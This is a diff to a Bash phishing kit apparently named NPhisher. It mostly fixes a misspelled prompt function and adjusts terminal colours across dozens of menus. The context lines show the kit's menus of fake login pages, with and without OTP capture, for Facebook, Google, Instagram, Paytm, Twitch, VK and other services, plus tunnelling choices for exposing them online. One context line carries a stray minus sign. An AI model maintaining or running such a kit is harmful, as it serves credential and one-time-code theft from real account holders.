@@ -106,6 +106,7 @@ ULLCYAN="\e[4;96m"
 ULWHITE="\e[4;97m"
 ##RESET ALL FONT AND COLOUR
 NF="\e[0;0m" 
+NA="${NC}${NF}"
 
 
 ##IMPORTANT VARIABLES
@@ -169,7 +170,7 @@ sbanner(){
 
 ## Update Prompt
 uprompt(){
-        prompt="$(echo -e ">> ${ULYELLOW}${selected} : ${BLUE}")"
+        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected} : ${NA}${BLUE}")"
 }
 
 ## Directories
@@ -1173,7 +1174,7 @@ echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detec
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 echo -e "${NC}"
 selected="NPhisher/${siname}/${sitype}"
-urprompt;read -p "${prompt}" tuchoice
+uprompt;read -p "${prompt}" tuchoice
         case $tuchoice in
                 1 | 01)
                         tunneler="LocalHost"
@@ -1403,7 +1404,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
 	1 | 01)
@@ -1439,7 +1440,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1467,7 +1468,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1495,7 +1496,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1523,7 +1524,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1551,7 +1552,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1589,7 +1590,7 @@ echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1625,7 +1626,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1660,7 +1661,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1693,7 +1694,7 @@ echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
 echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1741,7 +1742,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1778,7 +1779,7 @@ echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1816,7 +1817,7 @@ echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
 	1 | 01)
@@ -1852,7 +1853,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1884,7 +1885,7 @@ echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1928,7 +1929,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -1973,7 +1974,7 @@ echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
 echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2049,7 +2050,7 @@ echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2077,7 +2078,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2105,7 +2106,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2135,7 +2136,7 @@ echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2171,7 +2172,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2207,7 +2208,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2235,7 +2236,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2279,7 +2280,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2309,7 +2310,7 @@ echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2362,7 +2363,7 @@ echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2390,7 +2391,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2434,7 +2435,7 @@ echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2462,7 +2463,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2490,7 +2491,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2518,7 +2519,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2546,7 +2547,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2574,7 +2575,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2602,7 +2603,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2655,7 +2656,7 @@ echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2684,7 +2685,7 @@ echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2716,7 +2717,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2744,7 +2745,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2772,7 +2773,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2809,7 +2810,7 @@ echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2849,7 +2850,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2877,7 +2878,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2905,7 +2906,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2933,7 +2934,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2961,7 +2962,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -2990,7 +2991,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
@@ -3014,7 +3015,7 @@ echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 selected="NPhisher/${siname}"
-urprompt;read -p "${prompt}" sichoice
+uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
         1 | 01)
